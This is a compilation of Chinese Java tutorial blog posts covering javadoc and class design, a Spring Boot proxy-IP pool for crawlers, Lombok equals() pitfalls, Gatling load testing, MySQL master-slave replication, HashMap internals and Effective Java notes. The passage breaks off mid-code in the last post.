JDK 包含一个非常有用的工具，叫做 javadoc 。它通过分析我们的代码文件注释，自动生成 HTML 文档。每次修源码后，通过运行 javadoc 就可以轻松更新代码文档。Javadoc 功能包括：Javadoc搜索，支持生成HTML5输出，支持模块系统中的文档注释，以及简化的Doclet API。详细使用说明可参考 https://docs.oracle.com/en/java/javase/11/javadoc/javadoc.html
七、类的设计
一定要保证数据私有 务必确保封装性不被破坏。
一定要对数据初始化 Java 不会对局部变量进行初始化，但会对对象的实例域进行初始化。最好不要依赖于系统默认值，而是显式的对实例域进行初始化。
不要在类中使用过多的基本类型 通过定义一个新的类，来代替多个相关的基本类型的使用。
不是所有的域都需要独立的域访问器和域更改器
将职责过多的类进行分解 如果明显的可以将一个复杂的类分解为两个更简单的类，就应该将其分解。
类名和方法名要能够体现他们的职责 对于方法名，建议：访问器以小写 get 开头，修改器以小写 set 开头；对于类名，建议类名是采用一个名词（Order）、前面有形容词修饰的名词(RushOrder)或动名词(ing后缀)修饰名词（BillingAddress）。
优先使用不可变的类 要尽可能让类是不可变的，当然，也并不是所有类都应当是不可变的。

********************************************************************************************************************************************************************************************************
springboot实现java代理IP池 Proxy Pool，提供可用率达到95%以上的代理IP
 
一、背景
前段时间，写java爬虫来爬网易云音乐的评论。不料，爬了一段时间后ip被封禁了。由此，想到了使用ip代理，但是找了很多的ip代理网站，很少有可以用的代理ip。于是，抱着边学习的心态，自己开发了一个代理ip池。
 
二、相关技术及环境
技术： SpringBoot，SpringMVC, Hibernate, MySQL, Redis , Maven, Lombok, BootStrap-table，多线程并发环境： JDK1.8 , IDEA
 
三、实现功能
通过ip代理池，提供高可用的代理ip,可用率达到95%以上。

通过接口获取代理ip 通过访问接口，如：http://127.0.0.1:8080/proxyIp 返回代理ip的json格式







　

{
    "code":200,
    "data":[
        {
            "available":true,
            "ip":"1.10.186.214",
            "lastValidateTime":"2018-09-25 20:31:52",
            "location":"THThailand",
            "port":57677,
            "requestTime":0,
            "responseTime":0,
            "type":"https",
            "useTime":3671
        }
    ],
    "message":"success"
}


　　

通过页面获取代理ip 通过访问url，如：http://127.0.0.1:8080 返回代理ip列表页面。



提供代理ip测试接口及页面 通过访问url, 如：http://127.0.0.1:8080/test （get）测试代理ip的可用性；通过接口 http://127.0.0.1:8080/test ]（post data: {"ip": "127.0.0.1","port":8080} ） 测试代理ip的可用性。

 
四、设计思路
     4.1 模块划分



爬虫模块：爬取代理ip网站的代理IP信息，先通过队列再保存进数据库。
数据库同步模块：设置一定时间间隔同步数据库IP到redis缓存中。
缓存redis同步模块：设置一定时间间隔同步redis缓存到另一块redis缓存中。
缓存redis代理ip校验模块：设置一定时间间隔redis缓存代理ip池校验。
前端显示及接口控制模块：显示可用ip页面，及提供ip获取api接口。



     4.2 架构图

五、IP来源
代理ip均来自爬虫爬取，有些国内爬取的ip大多都不能用，代理池的ip可用ip大多是国外的ip。爬取的网站有：http://www.xicidaili.com/nn ，http://www.data5u.com/free/index.shtml ，https://free-proxy-list.net ，https://www.my-proxy.com/free-proxy-list.html ，http://spys.one/en/free-proxy-list/ ， https://www.proxynova.com/proxy-server-list/ ，https://www.proxy4free.com/list/webproxy1.html ，http://www.gatherproxy.com/ 。
六、如何使用
前提： 已经安装JDK1.8环境，MySQL数据库，Redis。先使用maven编译成jar,proxy-pool-1.0.jar。使用SpringBoot启动方式，启动即可。


java -jar proxy-pool-1.0.jar


 
实际使用当ip代理池中可用ip低于3000个，可用率在95%以上；当代理池中ip数量增加到5000甚至更多，可用率会变低（因为开启的校验线程数不够多）
有什么使用的问题欢迎回复。。。
本文代码已经提交github：https://github.com/chenerzhu/proxy-pool  欢迎下载。。。
 
 


********************************************************************************************************************************************************************************************************
lombok踩坑与思考
虽然接触到lombok已经有很长时间，但是大量使用lombok以减少代码编写还是在新团队编写新代码维护老代码中遇到的。
我个人并不主张使用lombok，其带来的代价足以抵消其便利，但是由于团队编码风格需要一致，用还是要继续使用下去。使用期间遇到了一些问题并进行了一番研究和思考，记录一下。
1. 一些杂七杂八的问题
这些是最初我不喜欢lombok的原因。
1.1 额外的环境配置
作为IDE插件+jar包，需要对IDE进行一系列的配置。目前在idea中配置还算简单，几年前在eclipse下也配置过，会复杂不少。
1.2 传染性
一般来说，对外打的jar包最好尽可能地减少三方包依赖，这样可以加快编译速度，也能减少版本冲突。一旦在resource包里用了lombok，别人想看源码也不得不装插件。
而这种不在对外jar包中使用lombok仅仅是约定俗成，当某一天lombok第一次被引入这个jar包时，新的感染者无法避免。
1.3 降低代码可读性
定位方法调用时，对于自动生成的代码，getter/setter还好说，找到成员变量后find usages，再根据上下文区分是哪种；equals()这种，想找就只能写段测试代码再去find usages了。
目前主流ide基本都支持自动生成getter/setter代码，和lombok注解相比不过一次键入还是一次快捷键的区别，实际减轻的工作量十分微小。
2. @EqualsAndHashCode和equals()
2.1 原理
当这个注解设置callSuper=true时，会调用父类的equlas()方法，对应编译后class文件代码片段如下：
public boolean equals(Object o) {
    if (o == this) {
        return true;
    } else if (!(o instanceof BaseVO)) {
        return false;
    } else {
        BaseVO other = (BaseVO)o;
        if (!other.canEqual(this)) {
            return false;
        } else if (!super.equals(o)) {
            return false;
        } else { 
            // 各项属性比较
        }
    }
}
如果一个类的父类是Object（java中默认没有继承关系的类父类都是Object），那么这里会调用Object的equals()方法，如下
public boolean equals(Object obj) {
    return (this == obj);
}
2.2 问题
对于父类是Object且使用了@EqualsAndHashCode(callSuper = true) 注解的类，这个类由lombok生成的equals()方法只有在两个对象是同一个对象时，才会返回true，否则总为false，无论它们的属性是否相同。这个行为在大部分时间是不符合预期的，equals()失去了其意义。即使我们期望equals()是这样工作的，那么其余的属性比较代码便是累赘，会大幅度降低代码的分支覆盖率。以一个近6000行代码的业务系统举例，是否修复该问题并编写对应测试用例，可以使整体的jacoco分支覆盖率提高10%~15%。
相反地，由于这个注解在jacoco下只算一行代码，未覆盖行数倒不会太多。
2.3 解决
有几种解决方法可以参考：

不使用该注解。大部分pojo我们是不会调用equals进行比较的，实际用到时再重写即可。
去掉callSuper = true。如果父类是Object，推荐使用。
重写父类的equals()方法，确保父类不会调用或使用类似实现的Ojbect的equals()。

2.4 其他
@data注解包含@EqualsAndHashCode注解，由于不调用父类equals()，避免了Object.equals()的坑，但可能带来另一个坑。详见@data章节。
3. @data
3.1 从一个坑出来掉到另一个大坑
上文提到@EqualsAndHashCode(callSuper = true) 注解的坑，那么 @data 是否可以避免呢？很不幸的是，这里也有个坑。
由于 @data 实际上就是用的 @EqualsAndHashCode，没有调用父类的equals()，当我们需要比较父类属性时，是无法比较的。示例如下：

@Data
public class ABO {
    private int a;

}

@Data
public class BBO extends ABO {

    private int b;

    public static void main(String[] args) {

        BBO bbo1 = new BBO();
        BBO bbo2 = new BBO();

        bbo1.setA(1);
        bbo2.setA(2);

        bbo1.setB(1);
        bbo2.setB(1);

        System.out.print(bbo1.equals(bbo2)); // true
    }
}
很显然，两个子类忽略了父类属性比较。这并不是因为父类的属性对于子类是不可见——即使把父类private属性改成protected，结果也是一样——而是因为lombok自动生成的equals()只比较子类特有的属性。
3.2 解决方法

用了 @data 就不要有继承关系，类似kotlin的做法，具体探讨见下一节
自己重写equals()，lombok不会对显式重写的方法进行生成
显式使用@EqualsAndHashCode(callSuper = true)。lombok会以显式指定的为准。

3.3 关于@data和data
在了解了 @data 的行为后，会发现它和kotlin语言中的data修饰符有点像：都会自动生成一些方法，并且在继承上也有问题——前者一旦有继承关系就会踩坑，而后者修饰的类是final的，不允许继承。kotlin为什么要这样做，二者有没有什么联系呢？在一篇流传较广的文章(抛弃 Java 改用 Kotlin 的六个月后，我后悔了(译文))中，对于data修饰符，提到：

Kotlin 对 equals()、hashCode()、toString() 以及 copy() 有很好的实现。在实现简单的DTO 时它非常有用。但请记住，数据类带有严重的局限性。你无法扩展数据类或者将其抽象化，所以你可能不会在核心模型中使用它们。
这个限制不是 Kotlin 的错。在 equals() 没有违反 Liskov 原则的情况下，没有办法产生正确的基于值的数据。

对于Liskov（里氏替换）原则，可以简单概括为：

一个对象在其出现的任何地方，都可以用子类实例做替换，并且不会导致程序的错误。换句话说，当子类可以在任意地方替换基类且软件功能不受影响时，这种继承关系的建模才是合理的。

根据上一章的讨论，equals()的实现实际上是受业务场景影响的，无论是否使用父类的属性做比较都是有可能的。但是kotlin无法决定equals()默认的行为，不使用父类属性就会违反了这个原则，使用父类属性有可能落入调用Object.equals()的陷阱，进入了两难的境地。
kotlin的开发者回避了这个问题，不使用父类属性并且禁止继承即可。只是kotlin的使用者就会发现自己定义的data对象没法继承，不得不删掉这个关键字手写其对应的方法。
回过头来再看 @data ，它并没有避免这些坑，只是把更多的选择权交给开发者决定，是另一种做法。
4. 后记
其他lombok注解实际使用较少，整体阅读了 官方文档暂时没有发现其他问题，遇到以后继续更新。
实际上官方文档中也提到了equals()的坑。

********************************************************************************************************************************************************************************************************
Gatling简单测试SpringBoot工程
 

 

前言
Gatling是一款基于Scala 开发的高性能服务器性能测试工具，它主要用于对服务器进行负载等测试，并分析和测量服务器的各种性能指标。目前仅支持http协议，可以用来测试web应用程序和RESTful服务。
除此之外它拥有以下特点：


支持Akka Actors 和 Async IO，从而能达到很高的性能


支持实时生成Html动态轻量报表，从而使报表更易阅读和进行数据分析


支持DSL脚本，从而使测试脚本更易开发与维护


支持录制并生成测试脚本，从而可以方便的生成测试脚本


支持导入HAR（Http Archive）并生成测试脚本


支持Maven，Eclipse，IntelliJ等，以便于开发


支持Jenkins，以便于进行持续集成


支持插件，从而可以扩展其功能，比如可以扩展对其他协议的支持


开源免费


 
依赖工具


Maven


JDK


Intellij IDEA


 
安装Scala插件
打开 IDEA ，点击【IntelliJ IDEA】 -> 【Preferences】 -> 【Plugins】，搜索 “Scala”，搜索到插件然后点击底部的 【Install JetBrains plugin…】安装重启即可。


 
Gatling Maven工程
创建Gatling提供的gatling-highcharts-maven-archetype,
在 IntelliJ中选择 New Project -> Maven -> Create form archetype -> Add Archetype，在弹出框中输入一下内容：

 GroupId: io.gatling.highcharts
 ArtifactId: gatling-highcharts-maven-archetype
 Version: 3.0.0-RC3

点击查看最新版本: 最新版本
之后输入你项目的GroupId(包名)和ArtifactId(项目名)来完成项目创建，
项目创建完成后，Maven会自动配置项目结构。

 



 
注:在创建的工程，修改pom.xml文件，添加如下配置,加快构建速度:

 <repositories>
      <repository>
        <id>public</id>
        <name>aliyun nexus</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
        <releases>
          <enabled>true</enabled>
        </releases>
      </repository>
    </repositories>
    <pluginRepositories>
      <pluginRepository>
        <id>public</id>
        <name>aliyun nexus</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
        <releases>
          <enabled>true</enabled>
        </releases>
        <snapshots>
          <enabled>false</enabled>
        </snapshots>
      </pluginRepository>
    </pluginRepositories>

 
工程项目目录
工程项目结构如下图：

 

项目目录说明：


bodies：用来存放请求的body数据


data：存放需要输入的数据


scala：存放Simulation脚本


Engine：右键运行跟运行 bin\gatling.bat 和bin\gatling.sh效果一致


Recorder：右键运行跟运行 bin\recorder.bat 和bin\recorder.sh效果一致，录制的脚本存放在scala目录下


target：存放运行后的报告


至此就可以使用IntelliJ愉快的开发啦。
 
Gatling测试SpringBoot
Gatling基于Scala开发的压测工具，我们可以通过录制自动生成脚本，也可以自己编写脚本，大家不用担心，首先脚本很简单常用的没几个，另外gatling封装的也很好我们不需要去专门学习Scala语法，当然如果会的话会更好。
SpringBoot测试工程示例
Maven依赖
代码如下

<parent>
          <groupId>org.springframework.boot</groupId>
          <artifactId>spring-boot-starter-parent</artifactId>
          <version>2.0.5.RELEASE</version>
          <relativePath/> <!-- lookup parent from repository -->
      </parent>
  ​
      <properties>
          <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
          <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
          <java.version>1.8</java.version>
      </properties>
  ​
      <dependencies>
          <dependency>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-web</artifactId>
          </dependency>
  ​
          <dependency>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-test</artifactId>
              <scope>test</scope>
          </dependency>
      </dependencies>

 
控制层接口
代码如下:

@RestController
  public class HelloWorldController {
      @RequestMapping("/helloworld")
      public String sayHelloWorld(){
          return "hello World !";
      }
  }

浏览器演示

 

Gatling测试脚本编写
Gatling基于Scala开发的压测工具，我们可以通过录制自动生成脚本，也可以自己编写脚本，大家不用担心，首先脚本很简单常用的没几个，另外gatling封装的也很好我们不需要去专门学习Scala语法，当然如果会的话会更好。
脚本示例

  import io.gatling.core.Predef._
  import io.gatling.http.Predef._
  ​
  class SpringBootSimulation extends Simulation{
    //设置请求的根路径
    val httpConf = http.baseUrl("http://localhost:8080")
    /*
      运行100秒 during 默认单位秒,如果要用微秒 during(100 millisecond)
     */
    val scn = scenario("SpringBootSimulation").during(100){
      exec(http("springboot_home").get("/helloworld"))
    }
    //设置线程数
    //  setUp(scn.inject(rampUsers(500) over(10 seconds)).protocols(httpConf))
    setUp(scn.inject(atOnceUsers(10)).protocols(httpConf))
  }

 
脚本编写

 

Gatling脚本的编写主要包含下面三个步骤


http head配置


Scenario 执行细节


setUp 组装


我们以百度为例，进行第一个GET请求测试脚本的编写，类必须继承 Simulation


配置下head，只是简单的请求下百度首页，所以只定义下请求的base url，采用默认的http配置即可

//设置请求的根路径
  val httpConf = http.baseURL("http://localhost:8080")

 


声明Scenario，指定我们的请求动作

val scn = scenario("SpringBootSimulation").during(100){
      exec(http("springboot_home").get("/helloworld"))
    }

 
scenario里的参数：scenario name   exec()里的参数就是我们的执行动作，http(“本次请求的名称”).get(“本次http get请求的地址”)


设置并发数并组装

 //设置线程数
  setUp(scn.inject(atOnceUsers(10)).protocols(httpConf))

atOnceUsers：立马启动的用户数，可以理解为并发数


这样我们一个简单的脚本就完成了，可以运行看下效果。
部分测试报告如下:


 
 

 
 
高级教程
Injection – 注入
注入方法用来定义虚拟用户的操作

 setUp(
    scn.inject(
      nothingFor(4 seconds), // 1
      atOnceUsers(10), // 2
      rampUsers(10) over(5 seconds), // 3
      constantUsersPerSec(20) during(15 seconds), // 4
      constantUsersPerSec(20) during(15 seconds) randomized, // 5
      rampUsersPerSec(10) to 20 during(10 minutes), // 6
      rampUsersPerSec(10) to 20 during(10 minutes) randomized, // 7
      splitUsers(1000) into(rampUsers(10) over(10 seconds)) separatedBy(10 seconds), // 8
      splitUsers(1000) into(rampUsers(10) over(10 seconds)) separatedBy atOnceUsers(30), // 9
      heavisideUsers(1000) over(20 seconds) // 10
    ).protocols(httpConf)
  )

 


nothingFor(duration)：设置一段停止的时间


atOnceUsers(nbUsers)：立即注入一定数量的虚拟用户

setUp(scn.inject(atOnceUsers(50)).protocols(httpConf))

 


rampUsers(nbUsers) over(duration)：在指定时间内，设置一定数量逐步注入的虚拟用户

setUp(scn.inject(rampUsers(50) over(30 seconds)).protocols(httpConf))

 


constantUsersPerSec(rate) during(duration)：定义一个在每秒钟恒定的并发用户数，持续指定的时间

 setUp(scn.inject(constantUsersPerSec(30) during(15 seconds)).protocols(httpConf))

 


constantUsersPerSec(rate) during(duration) randomized：定义一个在每秒钟围绕指定并发数随机增减的并发，持续指定时间

 setUp(scn.inject(constantUsersPerSec(30) during(15 seconds) randomized).protocols(httpConf))

 


rampUsersPerSec(rate1) to (rate2) during(duration)：定义一个并发数区间，运行指定时间，并发增长的周期是一个规律的值

 setUp(scn.inject(rampUsersPerSec(30) to (50) during(15 seconds)).protocols(httpConf))

 


rampUsersPerSec(rate1) to(rate2) during(duration) randomized：定义一个并发数区间，运行指定时间，并发增长的周期是一个随机的值

setUp(scn.inject(rampUsersPerSec(30) to (50) during(15 seconds) randomized).protocols(httpConf))

 


heavisideUsers(nbUsers) over(duration)：定义一个持续的并发，围绕和海维赛德函数平滑逼近的增长量，持续指定时间（译者解释下海维赛德函数，H(x)当x>0时返回1，x<0时返回0，x=0时返回0.5。实际操作时，并发数是一个成平滑抛物线形的曲线）

setUp(scn.inject(heavisideUsers(50) over(15 seconds)).protocols(httpConf))

 


splitUsers(nbUsers) into(injectionStep) separatedBy(duration)：定义一个周期，执行injectionStep里面的注入，将nbUsers的请求平均分配

setUp(scn.inject(splitUsers(50) into(rampUsers(10) over(10 seconds)) separatedBy(10 seconds)).protocols(httpConf))

 


splitUsers(nbUsers) into(injectionStep1) separatedBy(injectionStep2)：使用injectionStep2的注入作为周期，分隔injectionStep1的注入，直到用户数达到nbUsers

setUp(scn.inject(splitUsers(100) into(rampUsers(10) over(10 seconds)) separatedBy atOnceUsers(30)).protocols(httpConf))

 


循环

val scn = scenario("BaiduSimulation").
      exec(http("baidu_home").get("/"))

 
上面的测试代码运行时只能跑一次，为了测试效果，我们需要让它持续运行一定次数或者一段时间，可以使用下面两个方式：


repeat

  repeat(times，counterName)
  times:循环次数
  counterName:计数器名称，可选参数，可以用来当当前循环下标值使用，从0开始




 val scn = scenario("BaiduSimulation").repeat(100){
      exec(http("baidu_home").get("/"))
    }

 


during

during(duration, counterName, exitASAP)
  duration:时长，默认单位秒，可以加单位milliseconds，表示毫秒
  counterName:计数器名称，可选。很少使用
  exitASAP：默认为true,简单的可以认为当这个为false的时候循环直接跳出,可在
  循环中进行控制是否继续




  /*
      运行100秒 during 默认单位秒,如果要用微秒 during(100 millisecond)
     */
    val scn = scenario("BaiduSimulation").during(100){
      exec(http("baidu_home").get("/"))
    }

 
POST请求
post参数提交方式：


JSON方式

 import io.gatling.core.Predef._
  import io.gatling.core.scenario.Simulation
  import io.gatling.http.Predef._
  class JsonSimulation extends Simulation {
  val httpConf = http.baseURL("http://127.0.0.1:7001/tst")
  //注意这里,设置提交内容type
  val headers_json = Map("Content-Type" -> "application/json")
  val scn = scenario("json scenario")
      .exec(http("test_json")   //http 请求name
      .post("/order/get")     //post url
      .headers(headers_json)  //设置body数据格式
      //将json参数用StringBody包起,并作为参数传递给function body()
      .body(StringBody("{\"orderNo\":201519828113}")))
  setUp(scn.inject(atOnceUsers(10))).protocols(httpConf)
  }

 


Form方式

import io.gatling.core.Predef._
  import io.gatling.http.Predef._
  class FormSimulation extends Simulation {
  val httpConf = http
      .baseURL("http://computer-database.gatling.io")
  //注意这里,设置提交内容type
  val contentType = Map("Content-Type" -> "application/x-www-form-urlencoded")
  //声明scenario
  val scn = scenario("form Scenario")
      .exec(http("form_test") //http 请求name
      .post("/computers") //post地址, 真正发起的地址会拼上上面的baseUrl http://computer-database.gatling.io/computers
      .headers(contentType)
      .formParam("name", "Beautiful Computer") //form 表单的property name = name, value=Beautiful Computer
      .formParam("introduced", "2012-05-30")
      .formParam("discontinued", "")
      .formParam("company", "37"))
  setUp(scn.inject(atOnceUsers(1)).protocols(httpConf))



RawFileBody

  import io.gatling.core.Predef._
  import io.gatling.core.scenario.Simulation
  import io.gatling.http.Predef._
  class JsonSimulation extends Simulation {
  val httpConf = http.baseURL("http://127.0.0.1:7001/tst")
  //注意这里,设置提交内容type
  val headers_json = Map("Content-Type" -> "application/json")
  val scn = scenario("json scenario")
      .exec(http("test_json")   //http 请求name
      .post("/order/get")     //post url
      .headers(headers_json)  //设置body数据格式
      //将json参数用StringBody包起,并作为参数传递给function body()
      .body(RawFileBody("request.txt"))
  setUp(scn.inject(atOnceUsers(10))).protocols(httpConf)
  }

txt的文件内容为JSON数据，存放目录/resources/bodies下


 
Feed 动态参数
 Gatling对参数的处理称为Feeder[供料器]，支持主要有：


数组

 val feeder = Array(
  Map("foo" -> "foo1", "bar" -> "bar1"),
  Map("foo" -> "foo2", "bar" -> "bar2"),
  Map("foo" -> "foo3", "bar" -> "bar3"))

 


CSV文件

val csvFeeder = csv("foo.csv")//文件路径在 %Gatling_Home%/user-files/data/

 


JSON文件

 val jsonFileFeeder = jsonFile("foo.json")
  //json的形式：
  [
  {
      "id":19434,
      "foo":1
  },
  {
      "id":19435,
      "foo":2
  }
  ]

 


JDBC数据

jdbcFeeder("databaseUrl", "username", "password", "SELECT * FROM users")

 


Redis

可参看官方文档http://gatling.io/docs/2.1.7/session/feeder.html#feeder


使用示例：

import io.gatling.core.Predef._
import io.gatling.core.scenario.Simulation
import io.gatling.http.Predef._
import scala.concurrent.duration._
/**
* region请求接口测试
*/
class DynamicTest extends Simulation {
val httpConf = http.baseURL("http://127.0.0.1:7001/test")
//地区 feeder
val regionFeeder = csv("region.csv").random
//数组形式
val mapTypeFeeder = Array(
    Map("type" -> ""),
    Map("type" -> "id_to_name"),
    Map("type" -> "name_to_id")).random
//设置请求地址
val regionRequest =
    exec(http("region_map").get("/region/map/get"))
    //加载mapType feeder
    .feed(mapTypeFeeder)
    //执行请求, feeder里key=type, 在下面可以直接使用${type}
    .exec(http("province_map").get("/region/provinces?mType=${type}"))
    //加载地区 feeder
    .feed(regionFeeder)
    //region.csv里title含有provinceId和cityId,所以请求中直接引用${cityId}/${provinceId}
    .exec(http("county_map").get("/region/countties/map?mType=${type}&cityId=${cityId}&provinceId=${provinceId}"))
//声明scenario name=dynamic_test
val scn = scenario("dynamic_test")
        .exec(during(180){ regionRequest
        })
//在2秒内平滑启动150个线程(具体多少秒启动多少线程大家自己评估哈,我这里瞎写的)
setUp(scn.inject(rampUsers(150) over (2 seconds)).protocols(httpConf))
}

 
注意：通过下面的代码只会第一次调用生成一个随机数，后面调用不变

exec(http("Random id browse")
        .get("/articles/" + scala.util.Random.nextInt(100))
        .check(status.is(200))

 
Gatling的官方文档解释是，由于DSL会预编译，在整个执行过程中是静态的。因此Random在运行过程中就已经静态化了，不会再执行。应改为Feeder实现，Feeder是gatling用于实现注入动态参数或变量的，改用Feeder实现:

val randomIdFeeder = 
    Iterator.continually(Map("id" -> 
        (scala.util.Random.nextInt(100))))

feed(randomIdFeeder)
    .exec(http("Random id browse")
        .get("/articles/${id}"))
        .check(status.is(200))

feed()在每次执行时都会从Iterator[Map[String, T]]对象中取出一个值，这样才能实现动态参数的需求。


********************************************************************************************************************************************************************************************************
CentOS7下Mysql5.7主从数据库配置
本文配置主从使用的操作系统是Centos7，数据库版本是mysql5.7。
准备好两台安装有mysql的机器（mysql安装教程链接）
主数据库配置
每个从数据库会使用一个MySQL账号来连接主数据库，所以我们要在主数据库里创建一个账号，并且该账号要授予 REPLICATION SLAVE 权限
创建一个同步账号

create user 'repl'@'%' identified by 'repl_Pass1';

授予REPLICATION SLAVE权限：

GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';

要配置主数据库，必须要启用二进制日志，并且创建一个唯一的Server ID，打开mysql的配置文件并编辑（位置/etc/my.cnf），增加如下内容

log_bin=master-bin
log_bin_index = master-bin.index
server-id=4
expire-logs-days=7
binlog_ignore_db=mysql
binlog_ignore_db=information_schema
binlog_ignore_db=performation_schema
binlog_ignore_db=sys
binlog_do_db=mybatis

log_bin=master-bin 启动MySQL二进制日志
log_bin_index = master-bin.index
server-id=4  服务器唯一标识
expire-logs-days=7 二进制日志的有效期
binlog_ignore_db=mysql 不需要同步的数据库
binlog_ignore_db=information_schema
binlog_ignore_db=performation_schema
binlog_ignore_db=sys
binlog_do_db=mybatis 需要同步的数据库名字

重启mysql服务，查看主服务器状态：

show master status;


注意将方框里的两个值记录下来，后面在配置从数据库的时候用到。
 从数据库配置
同样编辑配置文件my.cnf，插入如下内容

server-id = 2
relay-log = slave-relay-bin
relay-log-index = slave-relay-bin.index


重启mysql服务，在slave服务器中登陆mysql，连接master主服务器数据库（参数根据实际填写）

change master to master_host='192.168.134.10', master_port=3306, master_user='repl', master_password='repl_Pass1', master_log_file='master-bin.000001', master_log_pos=2237；

启动slave

start slave;

测试主从是否配置成功
主从同步的前提必须是两个数据库都存在，本案例中我们需要建好两个名为mybatis的数据库
主库创建一个表

发现从库也创建了相同的表，然后发现主库的增删改操作都会自动同步。
 
********************************************************************************************************************************************************************************************************
HashMap 的数据结构
目录

content
append

content
HashMap 的数据结构：

数组 + 链表（Java7 之前包括 Java7）
数组 + 链表 + 红黑树（从 Java8 开始）

PS：这里的《红黑树》与链表都是链式结构。
HashMap 内部维护了一个数组，数组中存放链表的链首或红黑树的树根。
当链表长度超过 8 时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高 HashMap 的性能；在红黑树结点数量小于 6 时，红黑树转变为链表。
下面分别为上面两种数据结构的图示：



【定位算法】
增加、查找、删除等操作都需要先定位到 table 数组的某个索引处。
定位算法为三步：取 key 的 hashCode 值、高位运算、取模运算得到索引位置。（代码如下）
static final int hash(Object key) {
    int h;
    // h = key.hashCode() 第一步 取 hashCode 值
    // h ^ (h >>> 16)  第二步 高位参与运算 Java8 优化了高位算法，优化原理忽略
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

// java7 中这是一个单独的方法，java8 没有了这个方法但是原理依旧
static int indexFor(int h, int length) {
    return h & (length-1); // hash(key) & (length-1)  第三步 取模
}
取模运算h & (length -1)的结果最大值为 length -1，不会出现数组下标越界的情况。
为什么要做高位运算？
如果 hashCode 值都大于 length，而且这些 hashCode 的低位变化不大，就会出现很多冲突，举个例子：

假设数组的初始化容量为 16（10000），则 length -1 位 15（1111）。
假设有几个对象的 hashCode 分别为 1100 10010、1110 10010、11101 10010，如果不做高位运算，直接使用它们做取模运算的结果将是一致的。

如果所有元素中多数元素属于这种情况，将会导致元素分布不均匀，而对 hashCode 进行高位运算能解决这个问题，使高位对低位造成影响改变低位的值，从而变相地使高位也参与运算。
append
【Q】负载因子与性能的关系
负载因子默认值为0.75，意味着当数组实际填充量占比达到3/4时就该扩容了。
负载因子越大，扩容次数必然越少，数组的长度越小，减少了空间开销；这就会导致 hash 碰撞越多，增加查询成本。
默认值0.75在时间和空间成本上寻求一种折衷。

【Q】为什么要扩容
因为随着元素量的增大，hash 碰撞的概率越来越大，虽然使用链地址法能够解决存储问题，但是长长的链表会让 HashMap 失去快速检索的优势，而扩容能解决这个问题。
********************************************************************************************************************************************************************************************************
《Effective Java》学习笔记 —— 通用程序设计
 
　　本章主要讨论局部变量、控制结构、类库、反射、本地方法的用法及代码优化和命名惯例。
 
第45条 将局部变量的作用域最小化
　　* 在第一次使用的它的地方声明局部变量（就近原则）。
　　* 几乎每个局部变量的声明都应该包含一个初始化表达式。如果还没有足够的信息进行初始化，就延迟这个声明（例外：try-catch语句块）。
　　* 如果在循环终止之后不再需要循环变量的内容，for循环优先于while循环。
　　* 使方法小而集中（职责单一）。
 
第46条 for-each循环优先于传统的for循环
　　* 如果正在编写的类型表示的是一组元素，即使选择不实现Collection，也要实现Iterable接口，以便使用for-each循环。
　　* for-each循环在简洁性和预防Bug方面有着传统for循环无法比拟的优势，且没有性能损失。但并不是所有的情况都能用for-each循环，如过滤、转换和平行迭代等。
　　存在Bug的传统for循环代码示例：

 1 import java.util.*;
 2 
 3 /**
 4  * @author https://www.cnblogs.com/laishenghao/
 5  * @date 2018/10/7
 6  */
 7 public class OrdinaryFor {
 8     enum Suit {
 9         CLUB, DIAMOND, HEART, SPADE,
10     }
11     enum Rank {
12         ACE, DEUCE, THREE, FOUR, FIVE,
13         SIX, SEVEN, EIGHT, NINE, TEN,
14         JACK, QUEEN, KING,
15     }
16 
17     public List<Card> createDeck() {
18         Collection<Suit> suits = Arrays.asList(Suit.values());
19         Collection<Rank> ranks = Arrays.asList(Rank.values());
20 
21         List<Card> deck = new ArrayList<>();
22         for (Iterator<Suit> i = suits.iterator(); i.hasNext(); ) {
23             for (Iterator<Rank> j = ranks.iterator(); j.hasNext(); ) {
24                 deck.add(new Card(i.next(), j.next()));
25             }
26         }
27         return deck;
28     }
29 
30 
31     static class Card {
32         final Suit suit;
33         final Rank rank;
34 
35         public Card(Suit suit, Rank rank) {
36             this.suit = suit;
37             this.rank = rank;
38         }
39 
40         // other codes
41     }
42 }

采用for-each循环的代码（忽略对Collection的优化）：

 1     public List<Card> createDeck() {
 2         Suit[] suits = Suit.values();
 3         Rank[] ranks = Rank.values();
 4 
 5         List<Card> deck = new ArrayList<>();
 6         for (Suit suit : suits) {
 7             for (Rank rank : ranks) {
 8                 deck.add(new Card(suit, rank));
 9             }
10         }
11         return deck;
12     }

 
第47条 了解和使用类库
　　* 优先使用标准类库，而不是重复造轮子。
 
第48条 如果需要精确的答案，请避免使用float和double
　　* float和double尤其不适合用于货币计算，因为要让一个float或double精确的表示o.1（或10的任何其他负数次方值）是不可能的。

System.out.println(1 - 0.9);

上述代码输出（JDK1.8）：

　　* 使用BigDecimal（很慢）、int或者long进行货币计算。
　
第49条 基本类型优先于装箱基本类型
　　* 在性能方面基本类型优于装箱基本类型。当程序装箱了基本类型值时，会导致高开销和不必要的对象创建。
　　* Java1.5中增加了自动拆装箱，但并没有完全抹去基本类型和装箱基本类型的区别，也没有减少装箱类型的风险。
　　如下代码在自动拆箱时会报NullPointerException：

  Map<String, Integer> values = new HashMap<>();
  int v = values.get("hello");

　　
　　再考虑两个例子：
例子1：输出true

Integer num1 = 10;Integer num2 = 10;System.out.println(num1 == num2);

例子2：输出false

    Integer num1 = 1000;
    Integer num2 = 1000;
    System.out.println(num1 == num2);

　　为啥呢？
　　我们知道 “==” 比较的是内存地址。而Java默认对-128到127的Integer进行了缓存（这个范围可以在运行前通过-XX:AutoBoxCacheMax参数指定）。所以在此范围内获取的Integer实例，只要数值相同，返回的是同一个Object，自然是相等的；而在此范围之外的则会重新new一个Integer，也就是不同的Object，内存地址是不一样的。
　　具体可以查看IntegerCache类：


 1     /**
 2      * Cache to support the object identity semantics of autoboxing for values between
 3      * -128 and 127 (inclusive) as required by JLS.
 4      *
 5      * The cache is initialized on first usage.  The size of the cache
 6      * may be controlled by the {@code -XX:AutoBoxCacheMax=<size>} option.
